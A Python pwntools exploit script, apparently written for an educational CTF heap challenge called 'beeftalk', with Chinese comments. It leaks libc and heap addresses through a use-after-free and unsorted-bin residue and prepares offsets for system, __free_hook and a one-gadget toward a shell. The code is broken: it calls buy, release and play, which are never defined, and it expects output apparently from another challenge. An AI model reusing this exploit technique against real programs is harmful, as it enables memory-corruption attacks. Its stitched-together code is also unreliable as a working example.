#!/usr/bin/python3

from pwn import *
import sys

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

# if len(sys.argv) != 2:
#     print("./demo_final 1 - UAF              --> overwrite func ptr          --> system(\"/bin/sh\")")
#     print("./demo_final 2 - hijack name ptr  --> overwrite next chk func ptr --> one gadget")
#     print("./demo_final 3 - heap overflow    --> tcache poisoning            --> __free_hook to system --> free(\"/bin/sh\")")
#     exit(1)
    
r = process('./beeftalk')
# r = remote('edu-ctf.zoolab.org', 30207)

def login(token):
    r.sendlineafter('> ', '1')
    r.sendlineafter('Give me your token: \n> ', str(token))

def signup(name, desc, job, money):
    r.sendlineafter('> ', '2')
    r.sendlineafter("What's your name ?\n> ", name)
    r.sendlineafter("What's your desc ?\n> ", desc)
    r.sendlineafter("What's your job ?\n> ", job)
    r.sendlineafter("How much money do you have ?\n> ", money)
    r.sendlineafter("Is correct ?\n(y/n) >", 'y')
    
def goodbye():
    r.sendlineafter('> ', '3')

def updateuser(name, desc, job, money):
    r.sendlineafter('Name: \n> ', name)
    r.sendlineafter('Desc: \n> ', desc)
    r.sendlineafter('Job: \n> ', job)
    r.sendlineafter('Money: \n> ', str(money))

def chat(connect, token):
    r.sendlineafter('Connect to room with token ?\n(y/n) > ', connect)

signup('dummy', 'desc', 'student', 0)


# 1. 首先 allocate chunk size 0x420，釋放後再次取得，利用殘留在 chunk 的 unsorted bin 位址來 leak libc
buy(0, 0x410, 'dummy')
buy(1, 0x410, 'dummy') # 由於 freed chunk 相鄰 top chunk 時會觸發 consolidate，因此多放一塊 chk 來避免
release(0)
buy(0, 0x410, 'AAAAAAAA')
play(0)
r.recvuntil('A'*8)
# 從 bk 留下的 unsorted bin address 來 leak
libc = u64(r.recv(6).ljust(8, b'\x00')) - 0x1ebbe0
_system = libc + 0x55410
__free_hook = libc + 0x1eeb28
one_shot = libc + 0xe6c84
binsh = libc + 0x1b75aa
info(f"libc: {hex(libc)}")

# 2. 再利用 UAF 去 leak tcache 的 fd，得到 heap address
buy(0, 0x10, 'dummy')
buy(1, 0x10, 'dummy')
release(0)
release(1)
play(1)
r.recvuntil('MEOW, I am a cute ')
heap = u64(r.recv(6).ljust(8, b'\x00')) - 0xb40
info(f"heap: {hex(heap)}")

r.interactive()